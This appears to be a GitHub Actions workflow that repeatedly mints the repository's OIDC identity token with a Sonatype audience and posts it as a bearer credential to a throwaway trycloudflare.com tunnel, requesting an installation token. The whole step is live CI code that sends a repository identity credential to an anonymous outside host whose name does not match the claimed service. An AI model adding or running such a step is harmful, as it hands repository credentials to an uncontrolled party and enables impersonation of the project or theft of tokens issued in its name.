name: CI loop to IQ
on: workflow_dispatch
permissions:
  id-token: write
  contents: read
jobs:
  call:
    runs-on: ubuntu-latest
    steps:
      - run: |
          for i in $(seq 1 45); do
            OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://guide.sonatype.com" | jq -r .value)
            code=$(curl -s -o body.json -w '%{http_code}' -X POST -H "Authorization: Bearer $OIDC" -H 'Content-Type: application/json' -d '{}' https://assets-enables-badge-telephony.trycloudflare.com/api/agp/agp/installation-token)
            echo "$(date -u +%H:%M:%S) HTTP $code $(jq -c 'if .token then {token:"***"} else {status,detail} end' body.json 2>/dev/null | head -c 160)"
            sleep 3
          done
